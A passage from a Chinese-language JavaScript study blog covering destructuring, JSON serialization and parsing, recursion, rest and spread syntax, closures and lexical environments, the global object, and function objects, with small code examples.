<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">  name: <span class="string">&quot;Dave&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123;name, age=<span class="number">90</span>, job=<span class="string">&quot;Invester&quot;</span>&#125; = person;</span><br><span class="line">name; <span class="comment">// &quot;Dave&quot;</span></span><br><span class="line">age; <span class="comment">//90</span></span><br><span class="line">job; <span class="comment">// &quot;Inverster&quot;</span></span><br></pre></td></tr></table></figure>
<p>结合：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;name, <span class="attr">age</span>: a = <span class="number">90</span>, <span class="attr">job</span>: j = <span class="string">&quot;Invester&quot;</span>&#125; = person;</span><br><span class="line">name; <span class="comment">// &quot;Dave&quot;</span></span><br><span class="line">a; <span class="comment">//90</span></span><br><span class="line">j; <span class="comment">// &quot;Inverster&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>剩余…</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;name, ...others&#125; = personAdmin;</span><br><span class="line"></span><br><span class="line">name; <span class="comment">// &quot;Will&quot;</span></span><br><span class="line">others; <span class="comment">// &#123;age: 24, major: &quot;CS&quot;&#125;</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>提前声明变量，之后调用</strong></p>
<p>不使用<code>let</code>时进行解构赋值，需要在最外侧加一个圆括号。这是因为<strong>JS会将主代码流的<code>&#123;...&#125;</code>当作一个代码块</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name, age, major;</span><br><span class="line"></span><br><span class="line">(&#123;name, age, major&#125; = personAdmin);</span><br></pre></td></tr></table></figure>
<h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1></li>
</ol>
<p><strong>定义：</strong>JSON（JavaScript Object Notation）是表示值和对象的通用格式</p>
<h2 id="JSON-stringify-—-将对象转为JSON"><a href="#JSON-stringify-—-将对象转为JSON" class="headerlink" title="JSON.stringify — 将对象转为JSON"></a>JSON.stringify — 将对象转为JSON</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> student = &#123;</span><br><span class="line">  name: <span class="string">&#x27;John&#x27;</span>,</span><br><span class="line">  age: <span class="number">30</span>,</span><br><span class="line">  isAdmin: <span class="literal">false</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> json = <span class="built_in">JSON</span>.stringify(student);</span><br><span class="line"><span class="keyword">typeof</span> json; <span class="comment">// &#x27;string&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>注：</strong>通过<code>JSON.stringify()</code>方法将对象转换为字符串的过程称为 <strong>JSON编码</strong> 或 <strong>序列化（serialized）</strong>或<strong>字符串化</strong> 或 <strong>编组化</strong> </p>
</li>
<li><p><code>JSON</code>支持一下数据类型：</p>
<ol>
<li>Object <code>&#123;...&#125;</code></li>
<li>Array <code>[...]</code></li>
<li>Primitive:<ol>
<li>string</li>
<li>number</li>
<li>boolean</li>
<li>null</li>
</ol>
</li>
</ol>
</li>
<li><p>不能有循环引用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  rank: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">  rank: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">b.teacher = a;</span><br><span class="line">a.student = b;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringfiy(b); <span class="comment">// Error</span></span><br></pre></td></tr></table></figure>
<h3 id="JSON-stringify完整语法"><a href="#JSON-stringify完整语法" class="headerlink" title="JSON.stringify完整语法"></a>JSON.stringify完整语法</h3></li>
</ul>
<p>JSON的完整语法为： <code>JSON.stringify(value, replacer, space)</code>。</p>
<p>其中：</p>
<ol>
<li><strong>value</strong> — 要编码的对象</li>
<li><strong>replacer</strong> — 要编码的属性数组（或者使用映射函数）</li>
<li><strong>space</strong> — 用于格式化的空格数量</li>
</ol>
<ul>
<li><p>使用完整语法避免循环引用报错</p>
<ol>
<li>使用属性数组</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  rank: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">  rank: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">b.teacher = a;</span><br><span class="line">a.student = b;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(b, [<span class="string">&#x27;rank&#x27;</span>, <span class="string">&#x27;teacher&#x27;</span>]); <span class="comment">// &#x27;&#123;&quot;rank&quot;:2,&quot;teacher&quot;:&#123;&quot;rank&quot;:1&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>使用映射函数</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(b, <span class="function"><span class="keyword">function</span> <span class="title">replacer</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (key === <span class="string">&#x27;student&#x27;</span>) ? <span class="literal">undefined</span> : value;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="自定义toJSON"><a href="#自定义toJSON" class="headerlink" title="自定义toJSON"></a>自定义toJSON</h3></li>
</ul>
<p><strong>说明：</strong>如果对象有<code>toJSON</code>方法，则<code>JSON.stringify</code>会自动调用该方法</p>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  rank: <span class="number">1</span>,</span><br><span class="line">  <span class="function"><span class="title">toJSON</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.rank;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">  rank: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">b.teacher = a;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(a); <span class="comment">// &#x27;1&#x27;</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(b); <span class="comment">// &#x27;&#123;&quot;rank&quot;:2,&quot;teacher&quot;:1&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="JSON-parse-—-将JSON字符串转换为合适的数据格式"><a href="#JSON-parse-—-将JSON字符串转换为合适的数据格式" class="headerlink" title="JSON.parse — 将JSON字符串转换为合适的数据格式"></a>JSON.parse — 将JSON字符串转换为合适的数据格式</h2><p>基本语法：<code>JSON.parse(str, reviver)</code></p>
<p>其中：</p>
<ul>
<li><strong>str：</strong>要解析的JSON字符串</li>
<li><strong>reviver：</strong>可选函数，该函数对每个键值对<code>(key, value)</code>调用，并可改变其值</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nums = <span class="string">&quot;[0,1,2,3]&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> arrNums = <span class="built_in">JSON</span>.parse(nums);</span><br><span class="line">arrNums; <span class="comment">// [0,1,2,3]</span></span><br></pre></td></tr></table></figure>
<h3 id="使用reviver"><a href="#使用reviver" class="headerlink" title="使用reviver"></a>使用reviver</h3><p>用例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> meetingJSON = <span class="string">&#x27;&#123;&quot;title&quot;: &quot;Conference&quot;, &quot;date&quot;: &quot;2021-10-04T16:00:00.000Z&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wrongWay = <span class="built_in">JSON</span>.parse(meetingJSON);</span><br><span class="line">wrongWay; <span class="comment">// &#123;title: &#x27;Conference&#x27;, date: &#x27;2021-10-04T16:00:00.000Z&#x27;&#125; 可以看到date的值是字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> meetingObj = <span class="built_in">JSON</span>.parse(meetingJSON, <span class="function"><span class="keyword">function</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (key === <span class="string">&#x27;date&#x27;</span>) ? <span class="keyword">new</span> <span class="built_in">Date</span>(value) : value;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">meetingObj; <span class="comment">// &#123;title: &#x27;Conference&#x27;, date: Mon Oct 04 2021 17:00:00 GMT+0100 (British Summer Time)&#125;</span></span><br><span class="line">meetingObj.date.getDate(); <span class="comment">// 可以正常运行</span></span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>JSON是一种数据格式</li>
<li>JSON支持object, array, string, number, boolean, null</li>
<li>JavaScript提供序列化（serialize）成JSON的方法<code>JSON.stringify</code>和解析JSON的方法<code>JSON.parse</code></li>
<li>如果一个对象有<code>toJSON</code>方法，那么<code>JSON.stringify</code>会自动调用</li>
</ul>
]]></content>
      <categories>
        <category>Frontend/前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript函数进阶---学习笔记</title>
    <url>/en/2021/10/04/Javascript%E5%87%BD%E6%95%B0%E8%BF%9B%E9%98%B6/</url>
    <content><![CDATA[<p><strong>本章将深入J高级，诸如Spread语法、闭包、垃圾回收机制、函数对象、SetTimeout和SetInterval、装饰器模式和转发call/apply以及箭头函数。</strong></p>
<a id="more"></a>

<h1 id="递归和堆栈"><a href="#递归和堆栈" class="headerlink" title="递归和堆栈"></a>递归和堆栈</h1><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>一个函数在其内部调用自身，就是所谓的<strong>递归</strong></p>
<h3 id="递归和迭代（即循环）-—-两种思考方式"><a href="#递归和迭代（即循环）-—-两种思考方式" class="headerlink" title="递归和迭代（即循环） — 两种思考方式"></a>递归和迭代（即循环） — 两种思考方式</h3><ol>
<li>递归通常是将函数调用简化为一个更简单的函数调用，然而再将其简化为一个更简单的函数调用，如此反复，直到<strong>基础的递归</strong>（结果显而易见的）</li>
<li><strong>递归深度：</strong>最大的嵌套调用次数。在JS中，最大递归深度受限于JS引擎，引擎在最大递归深度小于等于10000时是可靠的。</li>
<li><strong>任何递归都可以用迭代（即循环）来重写。</strong>同时，循环算法更节省内存。但对于大多数任务来说，递归方法足够快，并且容易编写和维护。</li>
</ol>
<h2 id="执行上下文和堆栈-—-递归调用如何工作"><a href="#执行上下文和堆栈-—-递归调用如何工作" class="headerlink" title="执行上下文和堆栈 — 递归调用如何工作"></a>执行上下文和堆栈 — 递归调用如何工作</h2><p><strong>定义：</strong>执行上下文是一个内部数据结构，包含函数执行的详细细节（当前控制流所在位置，当前变量，this的值以及其他）</p>
<p><strong>当一个函数进行嵌套调用时：</strong></p>
<ol>
<li>当前函数被暂停</li>
<li>与它相关的执行上下文被<strong>执行上下文堆栈</strong>的特殊数据结构保存</li>
<li>执行嵌套调用</li>
<li>嵌套调用结束，从堆栈恢复之前的执行上下文，并从停止的位置继续执行</li>
</ol>
<h2 id="递归遍历-—-递归的应用之一"><a href="#递归遍历-—-递归的应用之一" class="headerlink" title="递归遍历 — 递归的应用之一"></a>递归遍历 — 递归的应用之一</h2><h2 id="递归结构"><a href="#递归结构" class="headerlink" title="递归结构"></a>递归结构</h2><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><h1 id="Rest参数与Spread语法"><a href="#Rest参数与Spread语法" class="headerlink" title="Rest参数与Spread语法"></a>Rest参数与Spread语法</h1><ul>
<li>rest参数作用：传入任意数量的参数</li>
<li>Spread作用：数组作为参数传入给支持任意数量参数的函数</li>
</ul>
<h2 id="Rest参数-—"><a href="#Rest参数-—" class="headerlink" title="Rest参数 — ..."></a>Rest参数 — <code>...</code></h2><p><strong>首先</strong>，在JavaScript中，无论函数是如何定义的，都可以传入任意数量的参数，并且不会报错，但只会将前n各定义的参数进行调用，而忽略多余的参数。</p>
<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p><code>...剩余参数数组名</code></p>
<p>例1：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sumAll</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>  (<span class="keyword">let</span> item <span class="keyword">of</span> args) &#123;</span><br><span class="line">    sum += item;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(sumAll(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)); <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>
<p>例2:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">members</span>(<span class="params">m1, m2, ...others</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(m1);</span><br><span class="line">  <span class="built_in">console</span>.log(m2);</span><br><span class="line">  <span class="built_in">console</span>.log(others.length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">members(<span class="string">&#x27;Will&#x27;</span>, <span class="string">&#x27;Dion&#x27;</span>, <span class="string">&#x27;Akshay&#x27;</span>, <span class="string">&#x27;Sam&#x27;</span>); <span class="comment">// &#x27;Will&#x27;, &#x27;Dion&#x27;, 2</span></span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong><code>...Rest</code>必须放在参数列表的最后，否则会报错</p>
<h2 id="arguments变量"><a href="#arguments变量" class="headerlink" title="arguments变量"></a><code>arguments</code>变量</h2><p><code>arguments</code>变量是一个特殊的类数组对象，该对象按参数索引包含所有参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>.length);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> person <span class="keyword">of</span> <span class="built_in">arguments</span>) sum += <span class="number">1</span>; <span class="comment">// 可遍历的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">showName(<span class="string">&#x27;Will&#x27;</span>); <span class="comment">// 1， &#x27;Will&#x27;, &#x27;undefined&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>注：</strong>箭头函数中没有<code>arguments</code>, 如果其嵌套在另一个“普通”函数中，则其访问到的<code>arguments</code>属于外部函数</p>
<h2 id="Spread-—"><a href="#Spread-—" class="headerlink" title="Spread — ..."></a>Spread — <code>...</code></h2><h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><p><code>...</code>+可迭代对象，即可将可迭代对象展开到参数列表中</p>
<p>用例：</p>
<ul>
<li><p>传递可迭代参数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.max(<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">29</span>,<span class="number">0</span>); <span class="comment">// 29</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">29</span>,<span class="number">0</span>];</span><br><span class="line"><span class="built_in">Math</span>.max(...arr); <span class="comment">// 29</span></span><br><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">8</span>,<span class="number">2</span>,<span class="number">1</span>,-<span class="number">9</span>];</span><br><span class="line"><span class="built_in">Math</span>.max(...arr, ...arr1); <span class="comment">// 29</span></span><br></pre></td></tr></table></figure></li>
<li><p>合并数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> arr2 = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">0</span>,...arr1,...arr2];</span><br><span class="line">arr; <span class="comment">// [0,1,2,3,4,5,6]</span></span><br></pre></td></tr></table></figure></li>
<li><p>字符串 — 因为Spread语法内部使用迭代器来收集元素，与<code>for...of</code>方式相同</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str1 = <span class="string">&#x27;Hello&#x27;</span>;</span><br><span class="line"></span><br><span class="line">[...str1]; <span class="comment">// [&#x27;H&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;o&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.from(str1); <span class="comment">// [&#x27;H&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;o&#x27;]</span></span><br></pre></td></tr></table></figure>
<p><code>Array.from(obj)</code>和<code>[...obj]</code>的差别：</p>
<ul>
<li><code>Array.from(obj)</code>的适用范围更广，不仅适用于类数组对象也适用于可迭代对象</li>
<li>Spread语法只适用于可迭代对象</li>
</ul>
</li>
</ul>
<h2 id="获取一个array-object的副本"><a href="#获取一个array-object的副本" class="headerlink" title="获取一个array/object的副本"></a>获取一个array/object的副本</h2><p>即spread语法也可以实现类似<code>Object.assign()</code>的功能——即浅拷贝</p>
<p>用例</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> arrCopy = [...arr];</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(arr) === <span class="built_in">JSON</span>.stringify(arrCopy); <span class="comment">// true</span></span><br><span class="line">arr === arrCopy; <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">arr.push(<span class="number">4</span>);</span><br><span class="line">arr; <span class="comment">// [1,2,3,4]</span></span><br><span class="line">arrCopy; <span class="comment">// [1,2,3]</span></span><br></pre></td></tr></table></figure>
<h1 id="变量作用域及闭包"><a href="#变量作用域及闭包" class="headerlink" title="变量作用域及闭包"></a>变量作用域及闭包</h1><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块 {...}"></a>代码块 <code>&#123;...&#125;</code></h2><p><strong>如果在代码块<code>&#123;...&#125;</code>中声明了一个变量。那么它只在该代码块内可见</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> only = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">  </span><br><span class="line">  only; <span class="comment">// &#x27;hello&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">only; <span class="comment">// Error: only is not defined</span></span><br></pre></td></tr></table></figure>
<p><strong>注：</strong>在同一个代码块中，如果对已存在的变量，使用<code>let</code>或<code>const</code>进行重复声明，则会报错</p>
<h3 id="if-for-while"><a href="#if-for-while" class="headerlink" title="if, for, while"></a><code>if</code>, <code>for</code>, <code>while</code></h3><p>对于<code>if</code>、<code>for</code>、<code>while</code>等，在<code>&#123;...&#125;</code>中声明的变量也仅在内部可见</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">3</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i); <span class="comment">// 0,1,2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(i); <span class="comment">// Error, no such variable</span></span><br></pre></td></tr></table></figure>
<p><strong>表面上看，<code>let i</code>也位于<code>&#123;...&#125;</code>之外，但<code>for</code>构造十分特殊，在<code>()</code>中声明的变量也被视作代码块的一部分</strong></p>
<h2 id="嵌套函数"><a href="#嵌套函数" class="headerlink" title="嵌套函数"></a>嵌套函数</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">speak</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">infoMan</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> name+<span class="string">&quot;: &quot;</span>+age;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">console</span>.log(infoMan());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">speak(<span class="string">&quot;Will&quot;</span>, <span class="number">24</span>);</span><br></pre></td></tr></table></figure>
<h2 id="词法环境"><a href="#词法环境" class="headerlink" title="词法环境"></a>词法环境</h2><h3 id="Step1-变量"><a href="#Step1-变量" class="headerlink" title="Step1. 变量"></a>Step1. 变量</h3><p>在JS中，每个运行的函数，代码块<code>&#123;...&#125;</code>，以及整个脚本，都有一个被称为<strong>词法环境</strong>的隐藏的关联对象。该词法环境对象由两部分组成：</p>
<ol>
<li><strong>环境记录</strong>——一个将所有局部变量作为其属性的对象</li>
<li>对<strong>外部词法环境</strong>的引用，与外部代码相关联</li>
</ol>
<p>例如：</p>
<p>![image-20211004201352993](/Users/arieskoo/Library/Application Support/typora-user-images/image-20211004201352993.png)</p>
<p>如上图，矩形表示<strong>环境记录</strong>，箭头表示<strong>外部引用</strong>，由于全局词法环境没有外部引用，所以箭头指向了<code>null</code></p>
<p><strong>注：</strong>词法环境是一个<strong>规范对象</strong>，它仅仅是理论上存在，但我们无法在代码中获取该对象</p>
<h3 id="Step2-函数声明"><a href="#Step2-函数声明" class="headerlink" title="Step2. 函数声明"></a>Step2. 函数声明</h3><p><strong>注：函数声明的初始化会被立即执行完成</strong>，所以不同于变量声明，函数可以在其被定义前使用。但是不适用于将函数分配给变量的函数表达式，如<code>let say = function()&#123;...&#125;</code></p>
<h3 id="Step3-内部和外部的词法环境"><a href="#Step3-内部和外部的词法环境" class="headerlink" title="Step3. 内部和外部的词法环境"></a>Step3. 内部和外部的词法环境</h3><p>在一个函数运行时，在其调用刚开始时，会自动创建一个新的词法环境来存储这个调用的局部变量和参数</p>
<p>![image-20211004230247163](/Users/arieskoo/Library/Application Support/typora-user-images/image-20211004230247163.png)</p>
<p>如图所示，内部词法环境存储一个单独的属性<code>name</code>，外部词法环境即全局词法环境存储<code>phrase</code>变量和函数本身。并且<strong>当代码要访问一个变量时，首先会搜索内部词法环境，然后搜索外部词法环境，然后搜索更外部的，直至全局词法环境。</strong>因此内部词法环境引用了<code>outer</code>去访问变量<code>phrase</code>。</p>
<h3 id="Step4-返回函数"><a href="#Step4-返回函数" class="headerlink" title="Step4. 返回函数"></a>Step4. 返回函数</h3><p>![image-20211004233226300](/Users/arieskoo/Library/Application Support/typora-user-images/image-20211004233226300.png)</p>
<p>如果要更新变量的值，变量会在其所在的词法环境中更新其自身的值（即变量将在同一位置更新值）</p>
<h3 id="Plus-闭包"><a href="#Plus-闭包" class="headerlink" title="Plus: 闭包"></a>Plus: 闭包</h3><p><strong>定义：</strong>闭包是指内部函数总是可以访问在外部函数中声明的变量和参数。JavaScript中的函数会自动通过隐藏的词法环境存储了创建它们的位置，所以他们都可以访问外部的变量。</p>
<h2 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h2><p>词法环境仅在可达到时才会被保留在内存中，否则词法环境及其中的所有变量都会被从内存中删除。</p>
<h1 id="全局对象"><a href="#全局对象" class="headerlink" title="全局对象"></a>全局对象</h1><p>全局对象提供任何地方都可以使用的变量和函数。在浏览器中，它叫<code>window</code>，在Node.js中，它叫<code>global</code>。但更通用的事<code>gloablThis</code>，几乎所有环境都支持该名称。</p>
<ul>
<li><p>全局对象的所有属性都可以直接被访问</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">alert(<span class="string">&#x27;Hello World!&#x27;</span>);</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="built_in">window</span>.alert(<span class="string">&#x27;Hello World!&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>使用<code>var</code>声明的变量会成为全局对象的属性（不建议使用）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rank = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.rank; <span class="comment">// 1</span></span><br></pre></td></tr></table></figure></li>
<li><p>如果要想在全局范围使用，可以直接将其作为属性写入</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.rank = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">window</span>.admin = &#123;</span><br><span class="line">  name: <span class="string">&quot;Will&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">rank; <span class="comment">// 1</span></span><br><span class="line">admin.name; <span class="comment">// &#x27;Will&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="使用ployfills"><a href="#使用ployfills" class="headerlink" title="使用ployfills"></a>使用ployfills</h2></li>
</ul>
<p>使用全局对象测试对现代JS语言的支持情况</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">window</span>.Promise) &#123;</span><br><span class="line">  <span class="built_in">window</span>.Promise = ... <span class="comment">// 该旧版本浏览器不支持Promise对象，因此手动实现该现代语言功能</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="函数对象，NFE"><a href="#函数对象，NFE" class="headerlink" title="函数对象，NFE"></a>函数对象，NFE</h1><p><strong>在JS中，函数就是对象</strong>，即我们不仅可以<strong>调用</strong>它们，还可以把它们当作对象，<strong>增删属性，按引用传递。</strong></p>
<h2 id="属性-“name”"><a href="#属性-“name”" class="headerlink" title="属性 “name”"></a>属性 “name”</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sayHi.name; <span class="comment">// &#x27;sayHi&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="属性-”length“"><a href="#属性-”length“" class="headerlink" title="属性 ”length“"></a>属性 ”length“</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params">a</span>) </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params">a,b</span>) </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f3</span>(<span class="params">a,b,..</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">f1.length; <span class="comment">// 1</span></span><br><span class="line">f2.length; <span class="comment">// 2</span></span><br><span class="line">f3.length; <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>可知，rest参数不参与计数</p>
<h2 id="自定义属性"><a href="#自定义属性" class="headerlink" title="自定义属性"></a>自定义属性</h2><p><strong>注：</strong> 属性不是变量，定义函数的属性，并不会在函数内部定义一个局部变量，即<strong>属性和变量是两个毫不相关的东西。</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  sayHi.counter++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sayHi.counter = <span class="number">0</span>;</span><br><span class="line">sayHi();</span><br><span class="line">sayHi();</span><br><span class="line">sayHi,counter; <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<h2 id="命名函数表达式（NFE-Named-Function-Expression）"><a href="#命名函数表达式（NFE-Named-Function-Expression）" class="headerlink" title="命名函数表达式（NFE, Named Function Expression）"></a>命名函数表达式（NFE, Named Function Expression）</h2><p><strong>定义：</strong>指带有名字的函数表达式</p>
<ol>
<li><p>普通函数表达式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sayHi = <span class="function"><span class="keyword">function</span>(<span class="params">who</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(who);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>命名函数表达式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sayHi = <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">who</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(who);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>命名函数表达式有两个特殊地方：</strong></p>
<ol>
<li>允许函数内部引用自身</li>
<li>在函数外部不可见</li>
</ol>
